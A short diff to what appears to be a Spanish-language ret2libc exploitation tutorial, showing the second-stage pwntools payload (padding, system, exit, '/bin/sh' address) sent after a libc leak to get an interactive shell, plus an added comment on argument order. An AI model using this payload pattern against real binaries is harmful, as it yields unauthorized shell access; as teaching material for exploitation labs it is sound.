@@ -176,8 +176,9 @@ exit = libc_base + 0x000356f0
 ```
 Y ahora es momento de lanzar nuestro segundo payload. Recordamos que al llamar a `write` para hacer el memory leak usamos a `main` como return address, por lo que es como si hubieramos corrido el binario de nuevo, es decir, tenemos que introducir nuestros 140 bytes de padding y todo como si fuese un exploit desde 0. El final de nuestro exploit queda así:
 
+
 ```python
-payload = junk + p32(system) + p32(exit) + p32(bin_sh)
+payload = junk + p32(system) + p32(exit) + p32(bin_sh) # Aclaración del orden de los argumentos: system(ret addr, cmd)
 
 p.sendline(payload)
 p.interactive()
